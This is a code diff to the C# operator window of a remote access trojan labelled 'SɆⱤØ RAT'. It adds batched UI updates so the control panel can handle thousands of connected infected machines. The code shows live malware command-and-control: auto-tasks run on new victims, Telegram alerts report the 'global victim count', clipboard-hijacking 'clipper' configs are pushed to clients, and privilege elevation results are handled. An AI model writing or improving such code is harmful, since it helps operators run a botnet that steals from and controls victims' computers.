@@ -23,7 +23,36 @@ public partial class ServerWindow : Window
     private readonly DispatcherTimer _uptimeTimer;
     private readonly System.Collections.ObjectModel.ObservableCollection<Data.AutoTaskEntry> _autoTasks = new();
     private Net.SeroDiscordRPC? _discordRpc;
-    private readonly ObservableCollection<ConnectedClient> _onlineClients = new();
+    // BulkObservableCollection: fires one Reset instead of N individual change events.
+    // Prevents DataGrid from refreshing N×N times when thousands of clients connect.
+    private sealed class BulkObservableCollection<T> : System.Collections.ObjectModel.ObservableCollection<T>
+    {
+        private bool _bulk;
+        public void AddRange(IEnumerable<T> items)
+        {
+            _bulk = true;
+            foreach (var item in items) Items.Add(item);
+            _bulk = false;
+            OnCollectionChanged(new System.Collections.Specialized.NotifyCollectionChangedEventArgs(System.Collections.Specialized.NotifyCollectionChangedAction.Reset));
+        }
+        public void RemoveRange(IEnumerable<T> items)
+        {
+            _bulk = true;
+            foreach (var item in items) Items.Remove(item);
+            _bulk = false;
+            OnCollectionChanged(new System.Collections.Specialized.NotifyCollectionChangedEventArgs(System.Collections.Specialized.NotifyCollectionChangedAction.Reset));
+        }
+        protected override void OnCollectionChanged(System.Collections.Specialized.NotifyCollectionChangedEventArgs e)
+        { if (!_bulk) base.OnCollectionChanged(e); }
+    }
+
+    private readonly BulkObservableCollection<ConnectedClient> _onlineClients = new();
+    // O(1) lookup by ID — mirrors _onlineClients, kept in sync by FlushClientQueue
+    private readonly Dictionary<string, ConnectedClient> _onlineById = new();
+    // Pending connect/disconnect ops, flushed every 150ms on the UI thread
+    private readonly System.Collections.Concurrent.ConcurrentQueue<(bool add, ConnectedClient client)> _clientQueue = new();
+    private DispatcherTimer? _batchTimer;
+
     private volatile bool _clientsDirty = true;
     private int _logLineCount;
     private const int LogMaxLines = 2000;
@@ -61,6 +90,12 @@ public partial class ServerWindow : Window
 
         _uptimeTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
         _uptimeTimer.Tick += (_, _) => RefreshUptime();
+
+        // Batch client connect/disconnect UI updates every 150ms
+        // This prevents the DataGrid from freezing when thousands of clients connect simultaneously
+        _batchTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(150) };
+        _batchTimer.Tick += FlushClientQueue;
+        _batchTimer.Start();
 
         Loaded += (_, _) =>
         {
@@ -317,7 +352,9 @@ public partial class ServerWindow : Window
             BtnStartStop.Content = "START";
             BtnStartStop.Style = (Style)FindResource("SGreenBtn");
             _server = null;
+            while (_clientQueue.TryDequeue(out _)) { }  // drain pending ops
             _onlineClients.Clear();
+            _onlineById.Clear();
             UpdateClientCount();
             TxtStatusLeft.Text = "SɆⱤØ RAT";
             TxtStatusLeft.Foreground = new SolidColorBrush(Color.FromRgb(0x2E, 0x30, 0x48));
@@ -337,41 +374,38 @@ public partial class ServerWindow : Window
             {
                 _server = new TlsServer(_store);
                 _server.OnLog += msg => Dispatcher.Invoke(() => Log(msg));
-                _server.ClientConnected += c => Dispatcher.BeginInvoke(async () =>
+                _server.ClientConnected += c =>
                 {
-                    bool isNewHwid = !_store.AllClients.TryGetValue(c.Hwid, out var rec)
-                                     || rec.ActivityLog.Count <= 1; // first connection ever
-                    _onlineClients.Add(c);
-                    _clientsDirty = true;
-                    UpdateClientCount();
-                    if (_autoTasks.Count > 0)
-                        await ExecuteAutoTasksForClient(c);
-                    // Server-side Telegram: fires with the true global victim count
-                    if (isNewHwid && BldTelegramEnabled.IsChecked == true)
-                        _ = ServerTelegramNotifyAsync(c);
-                    // Push clipper config automatically if running
-                    if (_clipperRunning && _server != null)
-                        await _server.SendToClient(c.Id, new Packet
-                        {
-                            Type = PacketType.ClipperSetConfig,
-                            Data = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(true))
-                        });
-                });
-                _server.ClientDisconnected += c => Dispatcher.BeginInvoke(() =>
-                {
-                    var existing = _onlineClients.FirstOrDefault(x => x.Id == c.Id);
-                    if (existing != null) _onlineClients.Remove(existing);
-                    _clientsDirty = true;
-                    UpdateClientCount();
+                    // UI update is batched — enqueue and let _batchTimer flush at 150ms intervals
+                    _clientQueue.Enqueue((true, c));
 
-                    // Close all feature windows open for this client
-                    var prefix = c.Id + ":";
-                    var toClose = _featureWindows
-                        .Where(kv => kv.Key.StartsWith(prefix, StringComparison.Ordinal))
-                        .ToList();
-                    foreach (var kv in toClose)
-                        try { kv.Value.Close(); } catch { }
-                });
+                    // Side effects: run on thread pool, read UI state via Dispatcher.Invoke
+                    _ = Task.Run(async () =>
+                    {
+                        bool isNewHwid = !_store.AllClients.TryGetValue(c.Hwid, out var rec)
+                                         || rec.ActivityLog.Count <= 1;
+
+                        if (_autoTasks.Count > 0)
+                            await ExecuteAutoTasksForClient(c);
+
+                        bool telegramEnabled = Dispatcher.Invoke(() => BldTelegramEnabled.IsChecked == true);
+                        if (isNewHwid && telegramEnabled)
+                            _ = ServerTelegramNotifyAsync(c);
+
+                        if (_clipperRunning && _server != null)
+                            await _server.SendToClient(c.Id, new Packet
+                            {
+                                Type = PacketType.ClipperSetConfig,
+                                Data = Newtonsoft.Json.JsonConvert.SerializeObject(
+                                    Dispatcher.Invoke(() => BuildClipperConfig(true)))
+                            });
+                    });
+                };
+                _server.ClientDisconnected += c =>
+                {
+                    // UI update batched — feature window closing handled in FlushClientQueue
+                    _clientQueue.Enqueue((false, c));
+                };
                 _server.ElevationResultReceived += (clientId, data) => Dispatcher.Invoke(() =>
                 {
                     var status = data.Success ? "ELEVATED" : "FAILED";
@@ -448,22 +482,79 @@ public partial class ServerWindow : Window
         TxtClientCount.Text = $"  |  {count} client{(count != 1 ? "s" : "")}";
     }
 
+    // Flush queued connect/disconnect operations in a single batch → one CollectionChanged (Reset)
+    private void FlushClientQueue(object? s, EventArgs e)
+    {
+        if (_clientQueue.IsEmpty) return;
+
+        var toAdd    = new List<ConnectedClient>();
+        var toRemove = new List<ConnectedClient>();
+        var toClose  = new List<string>();  // client IDs whose feature windows must close
+
+        while (_clientQueue.TryDequeue(out var op))
+        {
+            if (op.add)
+            {
+                if (!_onlineById.ContainsKey(op.client.Id))
+                    toAdd.Add(op.client);
+            }
+            else
+            {
+                if (_onlineById.ContainsKey(op.client.Id))
+                    toRemove.Add(op.client);
+                toClose.Add(op.client.Id);
+            }
+        }
+
+        if (toRemove.Count > 0)
+        {
+            foreach (var c in toRemove) _onlineById.Remove(c.Id);
+            _onlineClients.RemoveRange(toRemove);
+        }
+        if (toAdd.Count > 0)
+        {
+            foreach (var c in toAdd) _onlineById[c.Id] = c;
+            _onlineClients.AddRange(toAdd);
+        }
+
+        // Close feature windows for disconnected clients
+        foreach (var id in toClose)
+        {
+            var prefix = id + ":";
+            var keys   = _featureWindows.Keys.Where(k => k.StartsWith(prefix, StringComparison.Ordinal)).ToList();
+            foreach (var k in keys)
+            {
+                try { _featureWindows[k].Close(); } catch { }
+            }
+        }
+
+        if (toAdd.Count > 0 || toRemove.Count > 0)
+        {
+            _clientsDirty = true;
+            UpdateClientCount();
+        }
+    }
+
     private void RefreshClients()
     {
         if (_server == null) return;
-        // Sync _onlineClients with actual ConnectedClients
-        var current = _server.ConnectedClients.Values.ToHashSet();
-        // Remove stale
-        for (int i = _onlineClients.Count - 1; i >= 0; i--)
+        // O(n) sync using the dictionary — safe for 100k clients
+        var current = _server.ConnectedClients;
+
+        // Remove stale (O(n))
+        var toRemove = _onlineClients.Where(c => !current.ContainsKey(c.Id)).ToList();
+        if (toRemove.Count > 0)
         {
-            if (!current.Any(c => c.Id == _onlineClients[i].Id))
-                _onlineClients.RemoveAt(i);
+            foreach (var c in toRemove) _onlineById.Remove(c.Id);
+            _onlineClients.RemoveRange(toRemove);
         }
-        // Add missing
-        foreach (var c in current)
+
+        // Add missing (O(n))
+        var toAdd = current.Values.Where(c => !_onlineById.ContainsKey(c.Id)).ToList();
+        if (toAdd.Count > 0)
         {
-            if (!_onlineClients.Any(x => x.Id == c.Id))
-                _onlineClients.Add(c);
+            foreach (var c in toAdd) _onlineById[c.Id] = c;
+            _onlineClients.AddRange(toAdd);
         }
     }
 
